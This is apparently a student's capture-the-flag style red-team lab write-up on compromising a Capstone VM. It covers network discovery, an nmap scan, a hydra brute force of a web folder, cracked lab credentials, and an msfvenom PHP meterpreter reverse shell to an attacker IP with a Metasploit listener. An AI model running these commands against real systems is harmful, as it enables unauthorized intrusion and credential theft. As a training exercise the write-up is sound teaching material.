# Red vs Blue Team Project

# **RED TEAM - Penetration Test**

## **EXPLOITATION**
As the Red Team, I attacked a vulnerable Capstone VM within my environment, ultimately gaining root access to the machine. Entire attack was conducted using the Kali Machine.

### **Discover IP address of Linux web server:**
I used the command ip a to know the ip subnet.
```
ip a
```
![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%201.png)


I used the netdiscover -r <subnet ip> command to discover the target ip. The subnet ip is 192.168.1.0/24.
```
netdiscover -r 192.168.1.0/24
```
#### **Following is the output:**
 
![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%202.png)
 
 I got the ip details of all the machines on the subnet.
 
| IP | Machine |
|:-------------:|:-------------:|
| 192.168.1.1 | Hyper-V, Gateway IP |
| 192.168.1.105 | Capstone, target machine |
| 192.168.1.100 | ELK server |

Capstone machine has an ip of 192.168.1.105.
 
 ### **Navigating the Webserver:**
 
  #### **Service and Version Scan:**

I used the nmap -sV -v 192.168.1.105 command to do a service and version scan on the webserver. 
 
-sV: Probes open ports to determine service and version info.
 
```
nmap -sV -v 192.168.1.105
```
![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%203.png)
 
 That revealed the open ports on the webserver.
 
 ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%204.png)
 
| Port | Service | Version |
|:--:|:--:|:--:|
| Port 22 | SSH | OpenSSH 7.6p1 |
| Port 80 | HTTP | Apache httpd 2.4.29 |
 
  #### **Locate the hidden directory on the Webserver:**

 I opened the webbrowser on the attacker machine(Kali) and accessed the webserver using  its  ip **192.168.1.105**.
 
 ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%205.png)

 Navigating through the various folders, in the _company folders_ directory, I noticed the  reference to a &quot;_secret\_folder_&quot; in ALL documents within this directory,  which implies there is a folder called &quot;_secret\_folder_&quot; that I need to target.
 
 ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%207.png)
 
 ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%208.png)
 
 Navigating through the _meet\_our\_team_ folder confirms there are three users, whose credentilas can be used to log on.
 
 Each text file has a references to the _secret\_folder:_
 
  ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%209.png)

 Navigating through the _company\_blog_ folder confirms there are three users, whose credentilas can be used to log on.
 
 
  ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%206.png)

To get an access to the &quot;_secret\_folder_&quot;, I tried entering the following url:
 
```
192.168.1.0.5/company_folders/secret_folder
```
 ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2010.png)
 
I need a password to gain access to the &quot;_secret\_folder_&quot;. To get the password I Brute forced the password.
 
  #### **Brute Force the password:**
 
 Downloaded the **rockyou.txt** file. 
 
![alt-text]( https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Imagerockyou.png)
 
 and used the **hydra** command to Brute Force the password.
 
```
hydra -l ashton -P ./root/Downloads/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get "/company_folders/secret_folder"
```

![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/ashtonpsswd.png)
 
 Found the following login credentials for the user ashton:
 

| Username | Passwd| 
|:--:|:--:|
| ashton| leopoldo | 
 
 ### **Cracking the Password :**

I logged in the webserver using the above credentials. And gained access to the &quot;_secret\_folder_&quot;
 
 ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2011.png)
 
 Opening the connect &quot;_connect\_to\_corporate\_folder_&quot; displayed the following information.
 
  ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2012.png)
 
 This file had **CEO Ryan's** hashed password.And instructions to connect to the companies webdav server.
 
 I used **Crack Station** to crack Ryan's password.
 
 ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2015.png)
 
 Got following credentials for Ryan.
 
 | Username | Passwd| 
|:--:|:--:|
| ryan| linux4u | 
 
 ### **Connect to WebDav server:**
 
 Followed the instructions to connect to the webdav server, using Ryan's credential.
 
  ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2016.png)
 
 There is file called **passwddav** with the following contects: 
 
  ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2017.png)
  
  ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2018.png)
 
 ### **PHP Reverse Shell payload:**
 
 #### **Msfvenom**

I used **MSVenom** to upload a PHP reverse shell payload using the following command. Since 

```
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 -f raw -o shell.php
```

Using msfvenom we created a payload – shell.php

![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2019.png)
 
#### ** Metasploit**
 
 I used Metasploit which is a tool suite (a program comprised of multiple tools) for hacking servers and other networked devices. The main tools I used for this task are:

- MSFconsole: The main interface for Metasploit. Offers a centralized console to access all the options and modules. MSFconsole runs on our local machine.
- Meterpreter: A Linux-style shell that Metasploit launches once I successfully break into a target machine. Meterpreter runs on the compromised machine, not on the local machine.

To reiterate, I used  **MSFconsole** to find vulnerable machines and gain access to it. Once I exploited them, I used Meterpreter on the compromised machine.
 
 ```
msfconsole
use multi/handler
```

Once the payload was successfully uploaded, in order to create the reverse shell, we setup a listener using Metasploit.

![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2022.png)
 
 
After loading the exploit and activating the shell.php we uploaded earlier by clicking on it on the webserver, the target server connected to our listener and launched a meterpreter session into their system.


 ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2021.png)
 
 
 
 
 
 
 

